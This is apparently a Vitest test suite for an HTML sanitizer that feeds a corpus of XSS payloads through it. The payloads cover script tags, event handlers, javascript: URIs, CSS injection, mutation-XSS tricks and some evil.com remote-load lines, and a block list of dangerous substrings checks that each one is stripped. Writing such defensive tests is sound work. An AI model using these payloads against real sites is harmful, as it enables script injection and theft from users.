import { describe, it, expect } from 'vitest';
import { sanitizeRawHtml } from '../sanitize';

/**
 * XSS corpus for the raw-HTML sanitizer.
 *
 * The previous regex implementation was vulnerable to nested-tag
 * concatenation, mutation XSS, and HTML5 parser quirks. This test ensures
 * the sanitize-html-backed implementation strips script execution paths
 * across the OWASP cheat sheet, mutation-XSS catalogue, and a handful of
 * sanitizer-bypass payloads seen in the wild.
 *
 * Convention: every assertion either checks that a dangerous substring is
 * gone, or that the explicit `alert(1)`/`onerror` execution context is gone.
 * We don't try to over-fit on exact output strings — sanitize-html may
 * remove tags or just their attributes, both are acceptable defenses.
 */

const SUSPICIOUS = [
	'<script',
	'</script',
	'<iframe',
	'<svg',
	'<object',
	'<embed',
	'<form',
	'<style',
	'<meta',
	'<link',
	'<base',
	'<applet',
	'javascript:',
	'vbscript:',
	'data:text/html',
	'onerror=',
	'onload=',
	'onclick=',
	'onfocus=',
	'onmouseover=',
];

function assertNoDanger(output: string) {
	const lower = output.toLowerCase();
	for (const needle of SUSPICIOUS) {
		expect(lower).not.toContain(needle);
	}
}

describe('sanitizeRawHtml — direct script injection', () => {
	it.each([
		'<script>alert(1)</script>',
		'<SCRIPT>alert(1)</SCRIPT>',
		'<script src="//evil.com/x.js"></script>',
		'<script\ttype="text/javascript">alert(1)</script>',
		'<script\nsrc="evil.js"></script>',
	])('strips: %s', (payload) => {
		assertNoDanger(sanitizeRawHtml(payload));
	});
});

describe('sanitizeRawHtml — nested / concatenation tricks', () => {
	// Regex-based sanitizers were vulnerable to <scr<script>ipt> because
	// stripping the inner <script> leaves <script>ipt>. sanitize-html parses
	// HTML5 properly so this should be defused.
	it.each([
		'<scr<script>ipt>alert(1)</scr</script>ipt>',
		'<<script>script>alert(1)<</script>/script>',
		'<scr<script>ipt src=x>alert(1)<<<<<script>',
		'<sCrIpT>alert(1)</ScRiPt>',
	])('defuses concatenation: %s', (payload) => {
		const out = sanitizeRawHtml(payload);
		assertNoDanger(out);
	});
});

describe('sanitizeRawHtml — event-handler attributes', () => {
	it.each([
		'<img src=x onerror="alert(1)">',
		'<img src=x onerror=alert(1)>',
		'<img src=x ONERROR="alert(1)">',
		'<div onclick="alert(1)">click</div>',
		'<body onload="alert(1)">x</body>',
		'<input onfocus="alert(1)" autofocus>',
		'<svg onload="alert(1)"></svg>',
		'<a href="x" onmouseover="alert(1)">x</a>',
		// Newlines and tabs inside the attribute name (parser oddities)
		'<img src=x on\nerror="alert(1)">',
		'<img src=x on\terror="alert(1)">',
	])('strips event handler: %s', (payload) => {
		assertNoDanger(sanitizeRawHtml(payload));
	});
});

describe('sanitizeRawHtml — dangerous URI schemes', () => {
	it.each([
		'<a href="javascript:alert(1)">x</a>',
		'<a href="JAVASCRIPT:alert(1)">x</a>',
		'<a href=" javascript:alert(1)">x</a>',
		'<a href="java\tscript:alert(1)">x</a>',
		'<a href="vbscript:msgbox(1)">x</a>',
		'<a href="data:text/html,<script>alert(1)</script>">x</a>',
		'<img src="javascript:alert(1)">',
		'<form action="javascript:alert(1)"><input></form>',
	])('strips: %s', (payload) => {
		assertNoDanger(sanitizeRawHtml(payload));
	});
});

describe('sanitizeRawHtml — embedded frame / object', () => {
	it.each([
		'<iframe src="//evil.com"></iframe>',
		'<iframe srcdoc="<script>alert(1)</script>"></iframe>',
		'<object data="evil.swf"></object>',
		'<embed src="evil.swf">',
		'<applet code="Evil.class"></applet>',
	])('strips: %s', (payload) => {
		assertNoDanger(sanitizeRawHtml(payload));
	});
});

describe('sanitizeRawHtml — form / input', () => {
	it.each([
		'<form action="//evil.com"><input name="x"></form>',
		'<input type="image" src="x" onerror="alert(1)">',
		'<button onclick="alert(1)">x</button>',
		'<textarea onfocus="alert(1)">x</textarea>',
	])('strips: %s', (payload) => {
		assertNoDanger(sanitizeRawHtml(payload));
	});
});

describe('sanitizeRawHtml — style / CSS injection', () => {
	it.each([
		'<style>body{background:url(javascript:alert(1))}</style>',
		'<div style="background-image: url(javascript:alert(1))">x</div>',
		'<div style="background:url(\'javascript:alert(1)\')">x</div>',
		'<div style="behavior: url(x.htc)">x</div>',
		'<div style="-moz-binding: url(evil.xml)">x</div>',
		'<div style="expression(alert(1))">x</div>',
		'<style>@import url(//evil.com/x.css);</style>',
	])('strips: %s', (payload) => {
		const out = sanitizeRawHtml(payload);
		assertNoDanger(out);
		expect(out.toLowerCase()).not.toContain('expression(');
		expect(out.toLowerCase()).not.toContain('-moz-binding');
		expect(out.toLowerCase()).not.toContain('behavior:');
		expect(out.toLowerCase()).not.toContain('@import');
	});
});

describe('sanitizeRawHtml — mutation XSS / parser quirks', () => {
	it.each([
		// HTML comment evasion
		'<!--<script>alert(1)//--><script>alert(1)</script>',
		// CDATA-like
		'<![CDATA[<script>alert(1)</script>]]>',
		// noscript-wrapped scripts
		'<noscript><p title="</noscript><img src=x onerror=alert(1)>">x</p></noscript>',
		// XML namespace tricks (foreign content switching)
		'<svg><script>alert(1)</script></svg>',
		'<math><mtext><script>alert(1)</script></mtext></math>',
		'<svg><animate onbegin="alert(1)"></animate></svg>',
		// Base tag hijack
		'<base href="//evil.com/">',
		// Meta refresh
		'<meta http-equiv="refresh" content="0;url=//evil.com">',
	])('defuses: %s', (payload) => {
		assertNoDanger(sanitizeRawHtml(payload));
	});
});

describe('sanitizeRawHtml — keeps safe HTML intact', () => {
	it('keeps a paragraph with safe formatting', () => {
		const html = '<p><b>Hello</b> <i>world</i>. <a href="https://example.com">Link</a></p>';
		const out = sanitizeRawHtml(html);
		expect(out).toContain('<p>');
		expect(out).toContain('<b>Hello</b>');
		expect(out).toContain('<i>world</i>');
		expect(out).toContain('href="https://example.com"');
	});

	it('keeps mailto and tel links', () => {
		const html = '<a href="mailto:a@b.com">mail</a> <a href="tel:+1234">call</a>';
		const out = sanitizeRawHtml(html);
		expect(out).toContain('mailto:a@b.com');
		expect(out).toContain('tel:+1234');
	});

	it('keeps images with cid: scheme (inline attachments)', () => {
		const html = '<img src="cid:logo123" alt="logo">';
		const out = sanitizeRawHtml(html);
		expect(out).toContain('cid:logo123');
	});

	it('keeps a table', () => {
		const html = '<table><tr><td>A</td><td>B</td></tr></table>';
		const out = sanitizeRawHtml(html);
		expect(out).toContain('<table>');
		expect(out).toContain('<td>A</td>');
	});

	it('returns empty string for empty / falsy input', () => {
		expect(sanitizeRawHtml('')).toBe('');
	});
});
